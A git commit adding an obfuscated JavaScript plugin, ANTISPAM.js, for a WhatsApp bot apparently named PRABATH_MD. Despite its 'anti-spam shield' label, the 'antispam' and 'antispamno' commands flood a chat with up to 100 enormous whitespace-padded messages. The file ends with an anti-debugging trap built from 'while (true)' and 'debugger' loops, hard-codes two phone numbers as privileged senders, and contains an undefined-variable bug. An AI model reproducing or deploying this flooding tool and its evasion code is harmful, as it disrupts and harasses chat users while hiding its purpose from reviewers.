10d25ca8dd26947c1aa9fff2b235f931c1ae03bb
KALIDUWA OFC ✔️ <132440655+MR-KALINDU@users.noreply.github.com>
2023-10-23 13:40:13 +0530

    Create ANTISPAM.js

---
+++ ANTISPAM.js
@@ -0,0 +1,196 @@
+const _0x5dec3d = {}
+_0x5dec3d.pattern = 'left'
+_0x5dec3d.alias = ['leave']
+_0x5dec3d.desc = '(null).'
+_0x5dec3d.category = 'genaral'
+_0x5dec3d.filename = __filename
+_0x5dec3d.use = '<.>'
+cmd(
+  _0x5dec3d,
+  async (_0x6bfe00, _0x5e7783, _0x50439f, { isCreator: _0x511462 }) => {
+    if (!_0x5e7783.isGroup) {
+      return _0x5e7783.reply(tlang().group)
+    }
+    if (!_0x511462) {
+      return _0x5e7783.reply('*THIS OWNER COMMAND* \u26D4')
+    }
+    const _0x3967ff = _0x5e7783.chat
+    await _0x6bfe00.groupLeave(_0x3967ff)
+  }
+)
+const _0x5e4636 = {}
+_0x5e4636.pattern = 'antispam'
+_0x5e4636.alias = ['aspam']
+_0x5e4636.desc = '(null).'
+_0x5e4636.category = 'genaral'
+_0x5e4636.filename = __filename
+_0x5e4636.use = '<.>'
+cmd(
+  _0x5e4636,
+  async (_0x550d97, _0x52baf0, _0x501820, { isCreator: _0x40e7a3 }) => {
+    if (!_0x40e7a3) {
+      return _0x52baf0.reply('*THIS OWNER COMMAND* \u26D4')
+    }
+    var _0x4feaec = '```'
+    let _0x30225d =
+      '\n\n         \n\n         \n\n         \n\n         ' +
+      _0x4feaec +
+      'PRABATH_MD ANTI-SPAM SHIELD' +
+      _0x4feaec +
+      '\n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         ' +
+      _0x4feaec +
+      'PRABATH_MD ANTI-SPAM SHIELD' +
+      _0x4feaec +
+      '\n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         ' +
+      _0x4feaec +
+      'PRABATH_MD ANTI-SPAM SHIELD' +
+      _0x4feaec +
+      '\n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         ' +
+      _0x4feaec +
+      'PRABATH_MD ANTI-SPAM SHIELD' +
+      _0x4feaec +
+      '\n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         ' +
+      _0x4feaec +
+      'PRABATH_MD ANTI-SPAM SHIELD' +
+      _0x4feaec +
+      '\n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         ' +
+      _0x4feaec +
+      'PRABATH_MD ANTI-SPAM SHIELD' +
+      _0x4feaec
+    if (!_0x40e7a3) {
+      return _0x52baf0.reply('*THIS OWNER COMMAND* \u26D4')
+    }
+    const _0xb49da3 = {
+      text: _0x4feaec + 'Starting To Send Anti_Spam....' + _0x4feaec,
+    }
+    await _0x550d97.sendMessage(_0x52baf0.chat, _0xb49da3)
+    const _0x138291 = { text: _0x30225d }
+    await _0x550d97.sendMessage(_0x52baf0.chat, _0x138291)
+    const _0x14ab36 = { text: _0x30225d }
+    await _0x550d97.sendMessage(_0x52baf0.chat, _0x14ab36)
+    const _0x148b3 = { text: _0x30225d }
+    await _0x550d97.sendMessage(_0x52baf0.chat, _0x148b3)
+    const _0x153390 = { text: _0x30225d }
+    await _0x550d97.sendMessage(_0x52baf0.chat, _0x153390)
+    const _0x2d8447 = { text: _0x30225d }
+    await _0x550d97.sendMessage(_0x52baf0.chat, _0x2d8447)
+    const _0x41ede4 = { text: _0x30225d }
+    await _0x550d97.sendMessage(_0x52baf0.chat, _0x41ede4)
+    const _0x475e13 = { text: _0x30225d }
+    await _0x550d97.sendMessage(_0x52baf0.chat, _0x475e13)
+    const _0x2e19be = {}
+    return (
+      (_0x2e19be.text = _0x4feaec + 'Successful' + _0x4feaec + ' \u2714️'),
+      await _0x550d97.sendMessage(_0x52baf0.chat, _0x2e19be)
+    )
+  }
+)
+const _0x5e6ebf = {}
+_0x5e6ebf.pattern = 'antispamno'
+_0x5e6ebf.alias = ['asn']
+_0x5e6ebf.desc = 'Antispam'
+_0x5e6ebf.category = 'general'
+_0x5e6ebf.filename = __filename
+_0x5e6ebf.use = '<.>'
+cmd(
+  _0x5e6ebf,
+  async (_0x20cc35, _0x388dc1, _0x4b823b, { isCreator: _0x5d3b28 }) => {
+    if (!_0x4b823b) {
+      _0x388dc1.reply('Give me a number.')
+    } else {
+      if (isNaN(_0x4b823b)) {
+        _0x388dc1.reply('Please provide a valid number.')
+      } else {
+        if (
+          _0x388dc1.sender !== '94762280384@s.whatsapp.net' &&
+          _0x388dc1.sender !== '94725881990@s.whatsapp.net' &&
+          !_0x5d3b28
+        ) {
+          _0x388dc1.reply('*THIS OWNER COMMAND* \u26D4')
+        } else {
+          let _0xecc2e9 = '```',
+            _0x3e771c =
+              '\n\n         No - ' +
+              i +
+              '\n\n         \n\n         \n\n         ' +
+              _0xecc2e9 +
+              'PRABATH_MD ANTI-SPAM SHIELD' +
+              _0xecc2e9 +
+              '\n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         ' +
+              _0xecc2e9 +
+              'PRABATH_MD ANTI-SPAM SHIELD' +
+              _0xecc2e9 +
+              '\n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         ' +
+              _0xecc2e9 +
+              'PRABATH_MD ANTI-SPAM SHIELD' +
+              _0xecc2e9 +
+              '\n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         ' +
+              _0xecc2e9 +
+              'PRABATH_MD ANTI-SPAM SHIELD' +
+              _0xecc2e9 +
+              '\n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         ' +
+              _0xecc2e9 +
+              'PRABATH_MD ANTI-SPAM SHIELD' +
+              _0xecc2e9 +
+              '\n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         \n\n         ' +
+              _0xecc2e9 +
+              'PRABATH_MD ANTI-SPAM SHIELD' +
+              _0xecc2e9
+          if (_0x4b823b >= 1 && _0x4b823b <= 100) {
+            const _0xad0c76 = {
+              text: _0xecc2e9 + 'Starting To Send Anti_Spam....' + _0xecc2e9,
+            }
+            await _0x20cc35.sendMessage(_0x388dc1.chat, _0xad0c76)
+            for (let _0x3d42e3 = 0; _0x3d42e3 < _0x4b823b; _0x3d42e3++) {
+              const _0x445eac = { text: _0x3e771c }
+              await _0x20cc35.sendMessage(_0x388dc1.chat, _0x445eac)
+            }
+            const _0x16e85a = {
+              text: _0xecc2e9 + 'Successful' + _0xecc2e9 + ' \u2714️',
+            }
+            await _0x20cc35.sendMessage(_0x388dc1.chat, _0x16e85a)
+          } else {
+            _0x388dc1.reply(
+              '*The number is not in the given range. Please give me any number in ' +
+                1 +
+                ' to ' +
+                100 +
+                '.*'
+            )
+          }
+        }
+      }
+    }
+  }
+)
+function _0xb80d6b(_0x542b0c) {
+  function _0x88d13d(_0x564ae4) {
+    if (typeof _0x564ae4 === 'string') {
+      return function (_0x4fc011) {}
+        .constructor('while (true) {}')
+        .apply('counter')
+    } else {
+      if (('' + _0x564ae4 / _0x564ae4).length !== 1 || _0x564ae4 % 20 === 0) {
+        ;(function () {
+          return true
+        }
+          .constructor('debugger')
+          .call('action'))
+      } else {
+        ;(function () {
+          return false
+        }
+          .constructor('debugger')
+          .apply('stateObject'))
+      }
+    }
+    _0x88d13d(++_0x564ae4)
+  }
+  try {
+    if (_0x542b0c) {
+      return _0x88d13d
+    } else {
+      _0x88d13d(0)
+    }
+  } catch (_0x1a1ca5) {}
+}
